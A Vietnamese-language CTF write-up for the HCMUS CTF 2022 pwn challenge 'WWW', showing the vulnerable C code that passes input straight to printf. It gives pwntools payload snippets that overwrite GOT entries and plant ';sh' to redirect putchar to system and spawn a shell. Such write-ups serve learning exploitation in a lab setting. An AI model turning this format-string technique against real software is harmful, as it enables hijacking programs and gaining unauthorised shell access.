## Write-Up WWW (HCMUS CTF 2022 - Pwn)

Đầu tiên checksec nó đã

<img src="https://user-images.githubusercontent.com/54637811/168468917-5db0cab4-fbf0-47b7-ba0e-04ecd1f4dbb4.png" width="470" height="150" />

Bài này thì cho cả source code luôn, lỗi _Format String_ to đùng
```C
puts("Welcome all pwners to the magical guitar!!");
puts("Are you ready to play the best song ever?");
puts("First, tell me your name?");
fgets(buffer, sizeof(buffer), stdin);
printf(buffer);
puts("Great name for an artist!");
```

Cơ mà payload dài có 26.
Kế hoạch như sau:
 + Bước 1:
Ghi đè got của `putchar` bằng địa chỉ hàm `_start`, như thế chúng ta sẽ có vô hạn lần _Format String_
```python
part1 = bin.symbols['_start'] & 0xffff
payload = (f'%{part1}c%12$hn').encode().ljust(16, b'\x00') + \
        p64(bin.got['putchar'])
r.sendlineafter(b'your name?\n', payload)
```

 + Bước 2:
Ghi chuỗi `;sh` vào địa chỉ `SIGNATURE+1`, mục đích là tý đổi got của `putchar` sang `system@plt`, thì lúc đó get shell bằng cách `system("A;sh")`
```python
part1 = int.from_bytes(b';sh', 'little')
payload = (f'%{part1}c%12$n').encode().ljust(16, b'\x00') + p64(signature+1)
r.sendlineafter(b'your name?\n', payload)
```

 + Bước 3: Như đã nói ở trên, thay đổi got của `putchar` sang `system@plt`
```python
payload = b'%12$hhn'.ljust(0x10, b'\x00') + p64(bin.got['putchar'])
r.sendlineafter(b'your name?\n', payload)
```

Chắc vào vòng trong đề Pwn sẽ khó hơn
![image](https://user-images.githubusercontent.com/54637811/168469336-d003e56d-78cd-4d8c-a61b-00f0703f29fa.png)
